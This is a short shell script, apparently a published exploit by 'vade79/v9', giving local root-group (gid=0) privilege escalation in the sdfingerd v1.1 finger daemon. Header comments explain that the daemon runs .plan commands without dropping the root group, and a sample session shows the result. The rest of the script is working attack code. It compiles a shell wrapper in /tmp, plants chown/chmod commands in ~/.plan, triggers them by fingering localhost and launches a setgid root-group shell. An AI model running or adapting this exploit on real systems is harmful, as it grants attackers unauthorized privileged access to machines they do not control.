#!/bin/sh
# sdfingerd[v1.1]: local root(gid=0) exploit.
# by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)
#
# sdfingerd URL/reference:
#  http://www.schmolze.com/projects/sdfingerd/
#
# sdfingerd(Simple Dynamic Finger) is a finger
# daemon with the main focus of allowing users
# to be able to have dynamic .plan files.  dynamic
# as in allows users to place commands in their
# .plan file.  when a third party command is called,
# the user id privileges get set to that of the user
# being requested.  but, the group id is left as-is.
# since, this program is designed/defaulted to run
# as root via inetd, gid=0(root) is freely available.
#
# ----------------- example usage -----------------
# [v9@localhost v9]$ id
# uid=1001(v9) gid=1001(v9) groups=1001(v9)
# [v9@localhost v9]$ sh xsdfingerd.sh
# * sdfingerd[v1.1]: local root(gid) exploit.
# * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)
# * exploit successful.
# -rwx--s--- 1 v9 root 13960 Jun 18 18:38 /tmp/xsh
# sh-2.04$ id
# uid=1001(v9) gid=0(root) groups=1001(v9)
# -------------------------------------------------
echo "* sdfingerd[v1.1]: local root(gid=0) exploit."
echo "* by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)"
rm -rf ~/.plan /tmp/xsh.c /tmp/xsh
cat <<_EOF_>/tmp/xsh.c
#include <unistd.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
 setregid(getegid(),getegid());
 execl("/bin/sh","sh",0);
 exit(0);
}
_EOF_
cc /tmp/xsh.c -o /tmp/xsh
cat <<_EOF_>~/.plan
\$!chown \`id -u\`.\`id -g\` /tmp/xsh!$
\$!chmod 2710 /tmp/xsh!$
_EOF_
finger ${USER}@localhost>/dev/null
rm -rf ~/.plan /tmp/xsh.c
if test -g "/tmp/xsh"
then
 echo "* exploit successful."
 ls -l /tmp/xsh
 /tmp/xsh
else
 echo "! exploit failed."
 rm -rf /tmp/xsh
fi

